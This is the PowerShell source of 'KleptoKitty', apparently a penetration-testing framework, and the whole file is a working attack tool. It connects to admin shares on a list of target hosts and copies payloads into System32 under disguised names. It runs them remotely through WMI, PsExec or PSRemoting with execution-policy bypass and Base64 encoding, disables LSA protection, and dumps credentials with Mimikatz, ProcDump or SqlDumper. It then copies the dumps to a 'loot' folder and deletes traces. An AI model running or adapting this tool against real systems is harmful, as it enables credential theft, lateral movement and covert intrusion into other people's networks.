Function Invoke-KleptoKitty {

    <#
    .SYNOPSIS

        Invoke-KleptoKitty - Deploys Payloads and collects credentials


         =^._.^=
        _(      )/  KleptoKitty


        Author: Michael Schneider, scip AG
        License: MIT
        Required Dependencies: None
        Optional Dependencies: Mimikatz, PPLKiller, PsExec, ProcDump, SqlDumper


    .DESCRIPTION

        KleptoKitty is a lateral movement framework with the goal of collecting credentials.
        With a variety of techniques payloads are delivered to the target system, security controls
        are bypassed and credentials are dumped.

        KleptoKitty is the controller and takes charge of the transfer of files, execution of payloads
        and the cleanup afterwards. Any payloads can be used with KleptoKitty. KleptoKitty includes some
        sample payloads and little helpers for Base64 encoding or for encrypting data.


    .PARAMETER HostsFile

        Contains a list of target systems, one entry (IP address or hostname) is expected per line.


    .PARAMETER Hostname

        Can be used for simple tests, IP address or hostname can be used, one use would be the connection test.


    .PARAMETER RemoteCommandExecution

        Defines which lateral movement technique is used. KleptoKitty will support WMI, PsExec and WinRM.


    .PARAMETER Delivery

        Defines how the payload is transferred to the target system. The payload is copied by default.
        KleptoKitty will also support download via HTTP and copying of shares.


    .PARAMETER CredentialAccess

        Defines which technique is used for reading credentials. Mimikatz is the standard method,
        but KleptoKitty will also support ProcDump or dual use tools like SqlDumper


    .PARAMETER Bypass

        Defines if a bypass technique is used, for example to bypass LSA protection.
        Depending on the payload, the bypass technique may already be integrated
        into the Credential Access payload.


    .PARAMETER BinaryPsExec

        The path of the PsExec binary can be defined by the user.


    .PARAMETER TestConnection

        Performs a connection test to the target system at TCP port level


    .EXAMPLES
        
        Invoke-KleptoKitty -ComputerName target.example -TestConnection        
        Invoke-KleptoKitty -HostsFile .\targets.txt -CredentialAccess Mimikatz
    #>

    [CmdletBinding(DefaultParameterSetName='TargetHostname')]
    Param (

        [Parameter(ParameterSetName = 'TargetHostsFile',
            Mandatory=$true)]
        [ValidateScript({Test-Path $_})]
        [String]
        $HostsFile,

        [Parameter(ParameterSetName = 'TargetComputerName',
            Mandatory = $true)]
        [String]
        $ComputerName,

        [ValidateSet("WMI","PsExec","PSRemoting")]
        [String]
        $RemoteCommandExecution = "WMI",

        [ValidateSet("Copy","HTTP","SMB")]
        [String]
        $Delivery = "Copy",

        [ValidateSet("Demo","Mimikatz", "Mimikatz-mimidrv", "ProcDump", "SqlDumper")]
        [String]
        $CredentialAccess = "Demo",

        [ValidateSet("PPLKiller")]
        [String]
        $Bypass,

        [ValidateScript({Test-Path $_})]
        [String]
        $BinaryPsExec,

        [Switch]
        $TestConnection = $false
    )

    Function Write-ProtocolEntry {

        <#
        .SYNOPSIS

            Output of an event with timestamp and different formatting
            depending on the level.
        #>

        [CmdletBinding()]
        Param (
            
            [String]
            $Text,

            [String]
            $LogLevel
        )

        $Time = Get-Date -Format G
            
        Switch ($LogLevel) {
            "Info"     { $Message = "[*] $Time - $Text"; Write-Host $Message; Break}
            "Debug"    { $Message = "[-] $Time - $Text"; Write-Host -ForegroundColor Cyan $Message; Break}
            "Warning"  { $Message = "[?] $Time - $Text"; Write-Host -ForegroundColor Yellow $Message; Break}
            "Error"    { $Message = "[!] $Time - $Text"; Write-Host -ForegroundColor Red $Message; Break}
            "Success"  { $Message = "[$] $Time - $Text"; Write-Host -ForegroundColor Green $Message; Break}
            Default    { $Message = "[*] $Time - $Text"; Write-Host $Message; }
        } 
           
        Add-Content -Path $ProtocolPath -Value $Message
    }

    Function Test-RemoteConnection {

        <#
        .SYNOPSIS
    
            Performs a connection test to the target system at TCP port level,
            135/tcp for WMI, 445/tcp for SMB, 5985/tcp and 5986/tcp for WinRM.
            
            The cmdlet Test-NetConnection first sends an ICMP ping before the port scan.
        #>

        $ConnectionStatusWmi = Test-NetConnection -ComputerName $Hostname -Port 135 -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        If ($ConnectionStatusWmi.TcpTestSucceeded) {
            Write-ProtocolEntry -Text "Port 135/tcp is open" -LogLevel "Success"
        } Else {
            Write-ProtocolEntry -Text "Port 135/tcp is not open" -LogLevel "Error"
        } 
        $ConnectionStatusSmb = Test-NetConnection -ComputerName $Hostname -Port 445 -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        If ($ConnectionStatusSmb.TcpTestSucceeded) {
            Write-ProtocolEntry -Text "Port 445/tcp is open" -LogLevel "Success"
        } Else {
            Write-ProtocolEntry -Text "Port 445/tcp is not open" -LogLevel "Error"
        } 
        $ConnectionStatusWinrmHttp = Test-NetConnection -ComputerName $Hostname -Port 5985 -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        If ($ConnectionStatusWinrmHttp.TcpTestSucceeded) {
            Write-ProtocolEntry -Text "Port 5985/tcp is open" -LogLevel "Success"
        } Else {
            Write-ProtocolEntry -Text "Port 5985/tcp is not open" -LogLevel "Error"
        } 
        $ConnectionStatusWinrmHttps = Test-NetConnection -ComputerName $Hostname -Port 5986 -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        If ($ConnectionStatusWinrmHttps.TcpTestSucceeded) {
            Write-ProtocolEntry -Text "Port 5986/tcp is open" -LogLevel "Success"
        } Else {
            Write-ProtocolEntry -Text "Port 5986/tcp is not open" -LogLevel "Error"
        }
    }

    Function Copy-Payload {

        <#
        .SYNOPSIS
    
            Copies a file from source to destination using previously mounted drives.
        #>

        [CmdletBinding()]
        Param (
            
            [String]
            $Source,

            [String]
            $Destination
        )

        $ReturnCode = $true

        try {
            Copy-Item -Path $Source -Destination $Destination -ErrorAction Stop
        } catch {
            $ErrorReason = $_.Exception.Message
            Write-ProtocolEntry -Text "Copying payload to $Hostname failed. Reason: $ErrorReason" -LogLevel "Error"
            Write-ProtocolEntry -Text "$Hostname done" -LogLevel "Error"
            $ReturnCode = $false
        }

        return $ReturnCode
    }

    Function Execute-Payload {

        <#
        .SYNOPSIS
    
            Executes the payload on the target system. The technique selected by
            global parameter RemoteCommandExecution is used. Optionally, the payload can be
            executed Base64 encoded. This obscures arguments, but can also be an indicator for
            a malicious action. The choice is yours.

            Warning: Payload encoding is not supported for WinRM right now!

        #>

        [CmdletBinding()]
        Param (
            
            # Command of payload
            [String]
            $PayloadCommand,

            # Enable payload encoding
            [Switch]
            $EnableEncoding = $false
        )

        $ReturnCode = $true

        #
        # Encode payload command
        #
        If ($EnableEncoding) {
            $PayloadCommandEncoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PayloadCommand))
            $ArgumentList = "powershell.exe -Exec Bypass -Enc $PayloadCommandEncoded"
        
        } Else {
            $ArgumentList = "powershell.exe -Exec Bypass $PayloadCommand"
        }

        If ($RemoteCommandExecution -eq "WMI") {

            try {                               
                $WmiExec = Invoke-WmiMethod -Class "win32_process" -Name "create" -ArgumentList $ArgumentList -ComputerName $Hostname -Credential $AdminCredential -ErrorAction Stop
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry -Text "WMI connection to $Hostname failed. Reason: $ErrorReason" -LogLevel "Error"
                Write-ProtocolEntry -Text "$Hostname done" -LogLevel "Error"
                $ReturnCode = $false 
            }
        } ElseIf ($RemoteCommandExecution -eq "PsExec") {

            # 
            # Definition and check for PsExec
            # If PsExec is not available, the execution of the script is terminated
            #
            If (-Not $BinaryPsExec) {
                $BinaryPsExec = "$BasePath\PsExec64.exe"
            }    
            If (-Not (Test-Path $BinaryPsExec)) {
                Write-ProtocolEntry -Text "Binary for PsExec not found" -LogLevel "Error"
                $ReturnCode = $false
                return $ReturnCode
            }

            try {

                #
                # PsExec does not support the use of a credential object. The password must either be
                # entered manually, or can be seen in the command line. Since we are writing an IT security framework,
                # we enter the password manually. That goes without saying.
                #
                Write-ProtocolEntry -Text "Please copy password into the following line (blind):" -LogLevel "Debug"
                &$BinaryPsExec "\\$Hostname" -accepteula -nobanner -h -u $AdminUsername "powershell" $ArgumentList
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry -Text "PsExec connection to $Hostname failed. Reason: $ErrorReason" -LogLevel "Error"
                Write-ProtocolEntry -Text "$Hostname done" -LogLevel "Error"
                $ReturnCode = $false
            }
        } ElseIf ($RemoteCommandExecution -eq "PSRemoting") {
            try {
                $Session = New-PSSession -ComputerName $Hostname -Credential $AdminCredential
                $Job = Invoke-Command -Session $Session -Scriptblock { $PayloadCommand } 
                Remove-PSSession -Session $Session                
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry -Text "PSRemoting connection to $Hostname failed. Reason: $ErrorReason" -LogLevel "Error"
                Write-ProtocolEntry -Text "$Hostname done" -LogLevel "Error"
                $ReturnCode = $false 
            }
        }
        return $ReturnCode
    }

    Function Delete-File {

        <#
        .SYNOPSIS
    
            This function is used to delete a file from the target system.
            Should be applied to all copied and generated files.
        #>

        [CmdletBinding()]
        Param (
            
            # File to delete
            [String]
            $File
        )

        try {
            Remove-Item -Path $File -Force 
        } catch {
            $ErrorReason = $_.Exception.Message
            Write-ProtocolEntry -Text "Delete failed. Reason: $ErrorReason" -LogLevel "Error"                    
        }
    }

    Function Generate-RandomName {

        <#
        .SYNOPSIS
    
            Generate and return a random name.
            Can be extended at will, and should give the payload a trustworthy appearance.
        #>

        [CmdletBinding()]
        Param (
            
            # Type of name
            [ValidateSet("Script","Log","Executable")]
            [String]
            $Type
        )

        Switch($Type) {
            "Log"   {$RandomName = "de_ch", "setupmod", "en_ir", "Synaptics.MD", "fr_ch", "unso", "nI-NL" | Get-Random; Break}
            Default {$RandomName = "AdmTmpl", "agentactivationruntimestarter", "CallHistoryClient", "EasPolicyManagerBrokerPS", "LockScreenData", "MsSpellCheckingFacility", "ReAgentTask" | Get-Random;}
        }
                
        $RandomName 
    }

    #
    # KleptoKitty Parameters
    #
    # Environment parameter for KleptoKitty, among other things a protocol
    # of all actions with timestamp is created. This makes report writing easier later. :-)     
    #
    $KleptoKittyVersion = "0.2.3-1626784956"
    $CurrentLocation = Get-Location
    $BasePath = $CurrentLocation.Path
    $Timestamp = Get-Date -Format yyyyMMdd-HHmm    
    $ProtocolName = "protocol_kleptokitty-$Timestamp.txt"
    $ProtocolPath = "$BasePath\$ProtocolName"

    If (-not($HostsFile)) {
        $Hosts = @($Computername)
    } Else {
        $Hosts = Get-Content $HostsFile
    }

    #
    # Default payload settings for all hosts
    #
    # These settings apply to all payloads that are used in a run.
    # The key (token) with which the payloads were encrypted is also defined here.
    # If a separate key is used for each host, this must be adjusted later.
    #     
    Switch ($CredentialAccess) {
        "Demo"                { $PayloadNameCredentialAccess = "Write-Log.ps1"; Break}
        "Mimikatz"            { $PayloadNameCredentialAccess = "CredentialAccess-Mimikatz-Encrypted.ps1"; Break}
        "Mimikatz-mimidrv"    { $PayloadNameCredentialAccess = "CredentialAccess-Mimikatz-mimidrv-Encrypted.ps1"; Break}
        "ProcDump"            { $PayloadNameCredentialAccess = "CredentialAccess-Procdump.ps1"; Break}
        "SqlDumper"           { $PayloadNameCredentialAccess = "CredentialAccess-Sqldumper.ps1"; Break}
        Default               { $PayloadNameCredentialAccess = "Write-Log.ps1"; Break}
    }
    $PayloadPathCredentialAccess = "$BasePath\payloads\$PayloadNameCredentialAccess"
    $PayloadKeyCredentialAccess = "YourSecretKeyHere" # Use if the payload is encrypted

    Switch ($Bypass) {        
        "PPLKiller"           { $PayloadNameBypass = "Bypass-PPLKiller.ps1"; Break}        
        Default               { $PayloadNameBypass = "Bypass-PPLKiller.ps1"; Break}
    }
    $PayloadPathBypass = "$BasePath\payloads\$PayloadNameBypass"
    $PayloadKeyBypass = "YourSecretKeyHere" # Use if the payload is encrypted    

    #
    # Start Main
    # Push it. Dump it. Get it. Remove it. - by Tinker
    #
    Write-Output "`n"
    Write-Output "      =^._.^="
    Write-Output "     _(      )/  KleptoKitty $KleptoKittyVersion"
    Write-Output "`n"
    Write-ProtocolEntry -Text "Starting KleptoKitty" -LogLevel "Info"

    #
    # Request the credentials for the target system. This way KleptoKitty does not
    # need to be executed with administrative rights. Please do not store a clear text password
    # here or a kitten dies. :(
    #
    If(-not($TestConnection)) {
        $AdminCredential = Get-Credential
        $AdminUsername = $AdminCredential.UserName
        $AdminPassword = $AdminCredential.GetNetworkCredential().password
    }

    Foreach ($Hostname in $Hosts) {

        #
        # Test for open ports, finish script after the test
        #
        If($TestConnection) {
        
            Write-ProtocolEntry -Text "Starting connection test for $Hostname" -LogLevel "Info"
            Test-RemoteConnection
            Continue
        }

        #
        # Settings per host
        #
        $TargetShare = "\\$Hostname\c$"

        #
        # Map drive
        #
        If ($Delivery -eq "Copy") {

            Write-ProtocolEntry -Text "Connecting to $Hostname and mapping system drive" -LogLevel "Info"
            $PSDriveName = -join ((65..90) | Get-Random -Count 2 | % {[char]$_}) # Get 2 random letters

            try {            
                New-PSDrive -Name $PSDriveName -PSProvider FileSystem -Root $TargetShare -Credential $AdminCredential -ErrorAction Stop | Out-Null
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry -Text "Connection to $Hostname failed. Reason: $ErrorReason" -LogLevel "Error"
                Write-ProtocolEntry -Text "$Hostname done" -LogLevel "Error"
                Continue
            }
        }

        #
        # Bypass - Actions based on payload
        #
        If ($Bypass -eq "PPLKiller") {

            #
            # Payload setting per host
            #
            $RandomName = Generate-RandomName -Type "Script"
            $TargetBasePath = "Windows\System32"
            $TargetPayloadName = "$RandomName.ps1"
            $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
            $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"

            #
            # Settings and actions are based on delivery method
            # 
            If ($Delivery -eq "Copy") {

                # Copy Payload
                Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
                $ResultCopyPayload = Copy-Payload -Source $PayloadPathBypass -Destination $TargetPayloadPath
                If (-not($ResultCopyPayload)) { Continue }
            }

            # Execute Payload (Bypass for Execution-Policy)
            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"                
            $PayloadCommandBypass = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandBypass
            If ($ResultExecutePayload) {
                Write-ProtocolEntry -Text "Payload $PayloadBypass executed, LSASS protection is (hopefully) disabled now." -LogLevel "Success"
            }

            # House Cleaning
            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
            Delete-File -File $TargetPayloadPath            
        }

        #
        # Credential Access - Actions based on payload
        #
        If ($CredentialAccess -eq "Demo") {

            #
            # Payload setting per host
            #
            $RandomName = Generate-RandomName -Type "Script"
            $TargetBasePath = "Windows\System32"
            $TargetPayloadName = "$RandomName.ps1"
            $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
            $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"

            #
            # Settings and actions are based on delivery method
            # 
            If ($Delivery -eq "Copy") {

                # Copy Payload
                Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
                $ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
                If (-not($ResultCopyPayload)) { Continue }
            }

            # Execute Payload (Bypass for Execution-Policy)
            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"                
            $PayloadCommandCredentialAccess = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
            If ($ResultExecutePayload) {
                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
            }

            # House Cleaning
            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
            Delete-File -File $TargetPayloadPath            
        }
        
        If ($CredentialAccess -eq "Mimikatz" -or $CredentialAccess -eq "Mimikatz-mimidrv") {

            #
            # Payload setting per host
            #
            $DumpTargetName = $Hostname+"_mimikatz.log"
            $DumpTargetPath = "$basePath\loot\$DumpTargetName"
            $RandomName = Generate-RandomName -Type "Script"
            $TargetBasePath = "Windows\System32"
            $TargetPayloadName = "$RandomName.ps1"
            $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
            $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"
            $TargetDumpName = "de-ch.log"
            $TargetDumpBasePath = "Windows"
            $TargetDumpPath = "$TargetShare\$TargetDumpBasePath\$TargetDumpName"

            #
            # Settings and actions are based on delivery method
            # 
            If ($Delivery -eq "Copy") {

                # Copy payload
                Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
                $ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
                If (-not($ResultCopyPayload)) { Continue }
            }

            # Execute payload
            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"
            $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath -Token $PayloadKeyCredentialAccess"
            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess -EnableEncoding
            If ($ResultExecutePayload) {
                
                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
            
                # Good things come to those who wait
                $SleepTime = 60
                Write-ProtocolEntry -Text "Let Mimikatz finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
                Start-Sleep -Seconds $SleepTime

                # Collect information from host
                Write-ProtocolEntry -Text "Retrieving log file" -LogLevel "Info"
                $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
                If (($ResultCopyDump)) {
                    Write-ProtocolEntry -Text "Log file $DumpTargetName saved." -LogLevel "Success"
                    Delete-File -File $TargetDumpPath
                }
            }

            # House Cleaning
            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
            Delete-File -File $TargetPayloadPath
        }

        If ($CredentialAccess -eq "ProcDump") {

            #
            # Payload setting per host
            #
            $DumpTargetName = $Hostname+"_procdump.dmp"
            $DumpTargetPath = "$basePath\loot\$DumpTargetName"
            $RandomName = Generate-RandomName -Type "Script"
            $TargetBasePath = "Windows\System32"
            $TargetPayloadName = "$RandomName.ps1"
            $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
            $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"
            $TargetDumpName = "nI-NL.log"
            $TargetDumpBasePath = "Windows"
            $TargetDumpPath = "$TargetShare\$TargetDumpBasePath\$TargetDumpName"

            #
            # Settings and actions are based on delivery method
            # 
            If ($Delivery -eq "Copy") {

                # Copy payload
                Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
                $ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
                If (-not($ResultCopyPayload)) { Continue }
            }

            # Execute Payload (Bypass for Execution-Policy)
            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"
            $PayloadCommandCredentialAccess = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
            If ($ResultExecutePayload) {
            
                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"            

                # Good things come to those who wait
                $SleepTime = 600
                Write-ProtocolEntry -Text "Let ProcDump finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
                Start-Sleep -Seconds $SleepTime

                # Collect information from host
                Write-ProtocolEntry -Text "Retrieving dump file" -LogLevel "Info"
                $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
                If (($ResultCopyDump)) {
                    Write-ProtocolEntry -Text "Dump file $DumpTargetName saved." -LogLevel "Success"
                    Delete-File -File $TargetDumpPath
                }
            }

            # House Cleaning
            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
            Delete-File -File $TargetPayloadPath            
        }

        If ($CredentialAccess -eq "SqlDumper") {

            #
            # Payload setting per host
            #
            $DumpTargetName = $Hostname+"_sqldumper.mdmp"
            $DumpTargetPath = "$basePath\loot\$DumpTargetName"
            $RandomName = Generate-RandomName -Type "Script"
            $TargetBasePath = "Windows\System32"
            $TargetPayloadName = "$RandomName.ps1"
            $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
            $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"
            $TargetDumpName = "SQLDmpr0001.mdmp"
            $TargetDumpBasePath = "Windows\System32"
            $TargetDumpPath = "$TargetShare\$TargetDumpBasePath\$TargetDumpName"

            #
            # Settings and actions are based on delivery method
            # 
            If ($Delivery -eq "Copy") {

                # Copy payload
                Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
                $ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
                If (-not($ResultCopyPayload)) { Continue }
            }

            # Execute Payload (Bypass for Execution-Policy)
            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"
            $PayloadCommandCredentialAccess = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
            If ($ResultExecutePayload) {
    
                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
            
                # Good things come to those who wait
                $SleepTime = 30
                Write-ProtocolEntry -Text "Let SqlDumper finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
                Start-Sleep -Seconds $SleepTime

                # Collect information from host
                Write-ProtocolEntry -Text "Retrieving dump file" -LogLevel "Info"
                $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
                If (($ResultCopyDump)) {
                    Write-ProtocolEntry -Text "Dump file $DumpTargetName saved." -LogLevel "Success"
                    Delete-File -File $TargetDumpPath
                }
                
            }

            # House Cleaning
            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
            Delete-File -File $TargetPayloadPath                       
        }

        #
        # Delete drive
        #
        If ($Delivery -eq "Copy") {
            Write-ProtocolEntry -Text "Delete drive" -LogLevel "Info"
            try {
                Remove-PSDrive -Name $PSDriveName -Force -ErrorAction Stop
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry -Text "Delete drive failed. Reason: $ErrorReason" -LogLevel "Error"
            }
        }

        Write-ProtocolEntry -Text "$Hostname done" -LogLevel "Info" 
    }

    Write-ProtocolEntry -Text "KleptoKitty is done" -LogLevel "Info"
    Write-Output "`n"
}